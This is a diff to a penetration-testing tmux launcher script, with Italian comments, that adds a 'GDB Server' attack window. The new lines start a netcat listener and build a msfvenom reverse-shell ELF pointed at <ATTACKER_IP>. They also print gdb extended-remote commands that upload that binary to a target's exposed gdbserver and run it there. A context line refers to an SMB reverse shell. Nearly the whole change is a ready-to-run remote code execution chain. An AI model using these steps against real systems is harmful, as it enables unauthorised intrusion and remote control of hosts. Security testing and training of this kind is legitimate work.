@@ -2385,6 +2385,23 @@ tmux send-keys -t PT:24.11 "printf \"\n# SMB Activate Reverse Shell with CRedent
 tmux send-keys -t PT:24.11 ""
 cd $folderProject
 
+cd $folderProjectAuthN
+# GDB Server
+tmux new-window -t PT:25 -n '[1337] GDB Server'
+tmux split-window -v -t PT:25.0
+tmux split-window -v -t PT:25.1
+tmux split-window -v -t PT:25.2
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:25.0 "# GDB: Activate a listener" Enter
+tmux send-keys -t PT:25.0 "nc -nlvp 9001"
+tmux send-keys -t PT:25.1 "# GDB: Create an executable reverse shell" Enter
+tmux send-keys -t PT:25.1 "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=9001 PrependFork=true -f elf -o binary.elf && chmod +x binary.elf"
+tmux send-keys -t PT:25.2 "printf \"\n# GDB: Activate GDB\n# Use these command to implement the attack:\n# (gdb) target extended-remote $ip:1337\n# (gdb) remote put binary.elf binary.elf\n# (gdb) set remote exec-file /home/user/binary.elf\n# (gdb) run\n\" " Enter
+tmux send-keys -t PT:25.2 "gdb binary.elf"
+cd $folderProject
+
+
+
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
 ;;
